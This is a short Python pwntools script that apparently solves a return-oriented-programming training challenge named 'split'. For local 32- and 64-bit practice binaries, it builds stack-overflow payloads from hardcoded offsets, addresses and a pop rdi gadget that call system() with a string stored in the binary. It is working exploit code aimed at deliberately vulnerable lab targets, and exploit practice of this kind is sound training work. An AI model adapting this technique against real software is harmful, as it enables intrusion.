#!/usr/bin/python3

from pwn import *
import sys

def first_binary(): #x32 binary

	binary = './split32'
	io = process(binary)
	context.log_level = 'info'

	eip_offset = 44
	system = 0x80483e0
	usefulString = 0x0804a030
	main = 0x08048546

	payload = b'a' * eip_offset + p32(system) + p32(main) + p32(usefulString)

	io.sendlineafter('> ',payload)
	print(io.recv())
	print(io.recv())

	io.close()
	return True

def second_binary(): #x64 binary
	
	#Because this is x64 the function arguments are passed by registers 

	binary = './split'
	io = process(binary)
	context.log_level = 'info'

	rsp_offset = 40
	system = 0x400560
	usefulString = 0x601060
	pop_rdi = 0x4007c3

	payload = b'a' * rsp_offset + p64(pop_rdi) + p64(usefulString) + p64(system) 

	io.sendlineafter('> ',payload)
	print(io.recv())
	print(io.recv())

	io.close()
	return True

#try:
if sys.argv[1] == "32":
	first_binary()
elif sys.argv[1] == "64":
	second_binary()
else:
		print("Please enter 32 or 64")
#except:
	#print("Usage: ./split.py <64 or 32>")